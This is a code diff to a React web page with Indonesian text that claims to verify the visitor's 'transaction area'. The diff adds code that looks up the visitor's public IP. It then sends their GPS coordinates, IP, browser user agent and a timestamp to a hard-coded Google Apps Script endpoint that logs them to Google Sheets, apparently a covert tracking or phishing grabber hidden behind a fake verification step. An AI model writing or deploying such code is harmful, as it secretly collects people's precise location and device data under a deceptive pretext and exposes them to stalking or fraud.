@@ -8,10 +8,19 @@ function App() {
 
   const [error, setError] = useState<React.ReactNode | null>(null);
 
-  const requestLocation = () => {
+  const requestLocation = async () => {
     setError(null);
     setIsVerifying(true);
     setLocationStatus('Membutuhkan verifikasi area transaksi Anda...');
+
+    let ipAddress = 'Unknown';
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      ipAddress = ipData.ip;
+    } catch (e) {
+      console.error("Gagal mendapatkan IP:", e);
+    }
 
     if ('geolocation' in navigator) {
       navigator.geolocation.getCurrentPosition(
@@ -21,16 +30,23 @@ function App() {
           setLocationStatus('Verifikasi berhasil.');
           setTimeout(() => setIsVerifying(false), 1000);
           
-          fetch('/api/location', {
+          // GANTI URL INI dengan URL Web App dari Google Apps Script Anda
+          const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby2wLdhOz2RT269wecM2Eze6M-AZ95PL1hJFV4ghMKhgDNb_XB-fQAXdGqMpi6fJGtu/exec';
+          
+          fetch(GOOGLE_SCRIPT_URL, {
             method: 'POST',
+            mode: 'no-cors',
             headers: {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify({
               lat: latitude,
-              lng: longitude
+              lng: longitude,
+              ip: ipAddress,
+              userAgent: navigator.userAgent,
+              timestamp: new Date().toISOString()
             })
-          }).catch(err => console.error("Gagal mengirim data lokasi:", err));
+          }).catch(err => console.error("Gagal mengirim data ke Google Sheets:", err));
         },
         (err) => {
           console.error("Error getting location", err);
